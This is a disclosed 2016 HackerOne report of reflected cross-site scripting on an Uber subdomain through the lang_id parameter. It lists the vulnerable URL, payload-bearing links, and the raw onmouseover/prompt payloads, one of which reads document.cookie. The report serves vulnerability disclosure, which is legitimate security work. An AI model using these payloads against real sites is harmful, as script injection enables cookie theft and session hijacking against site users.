# HackerOne Report #156098 — XSS At "pages.et.uber.com"

- **Program:** unknown
- **Severity:** n/a
- **Weakness:** Cross-site Scripting (XSS) - Generic (n/a)
- **State:** Closed
- **Reporter:** raghav_bisht
- **Reported:** n/a
- **Disclosed:** 2016-08-19T17:32:23.081Z
- **Bounty:** n/a

## Full disclosure

Vulnerable Domain :
-------------------
https://pages.et.uber.com/

Vulnerable Link :
-----------------
https://pages.et.uber.com/icecream/?lang_id=5


Edited Link With Payload :
--------------------------
https://pages.et.uber.com/icecream/?lang_id=5%22%20onmouseover%3dprompt(document.domain)%20bad%3d%22
https://pages.et.uber.com/icecream/?lang_id=5%22%20onmouseover%3dprompt(document.cookie)%20bad%3d%22
https://pages.et.uber.com/icecream/?lang_id=5%22%20onmouseover%3dprompt(9020)%20bad%3d%22


Payload Used :
--------------

" onmouseover%3dprompt(9020) bad%3d"
" onmouseover%3dprompt(document.domain) bad%3d"
" onmouseover%3dprompt(document.cookie) bad%3d"
